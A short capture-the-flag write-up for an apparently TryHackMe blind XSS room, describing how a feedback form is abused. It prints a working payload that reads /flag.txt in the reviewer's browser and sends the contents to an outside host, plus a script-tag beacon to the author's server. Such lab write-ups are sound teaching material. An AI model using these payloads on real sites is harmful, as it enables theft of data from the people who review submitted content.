## The Sticker Shop 
You can join this room [Here](https://tryhackme.com/r/room/thestickershop)

This was an easy-level XSS challenge where the goal was to inject Blind XSS and retrieve the flag. Initially, I tried directory brute-forcing, but it yielded no results.The endpoint `http://xxx/submit_feedback` which allowed form submissions and the response only included a static reflection: ` Thanks for your feedback! It will be evaluated shortly by our staff`.

From the challenge description: `they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback`. This clue suggested that the feedback would eventually be reviewed in staff's browser on the same system, making it a perfect scenario for Blind XSS. And listening on remote won't be worked.

### Exploitation
I hosted a local server on port 5000 and injected the following payload: `<script src="http://myip:5000"></script>` . When the payload executed, it confirmed that the feedback was being reviewed in a browser.
Next, I attempted to retrieve the contents of the `flag.txt` file using this payload:

`<script>fetch('/flag.txt').then(res => res.text()).then(flag => fetch('http://myweb.com/?flag='+encodeURIComponent(flag)))</script>`

After submitting the payload, I successfully received the flag: `THM{837xxxxxxxxxxx05ee6}`

\>_ Happy Hacking
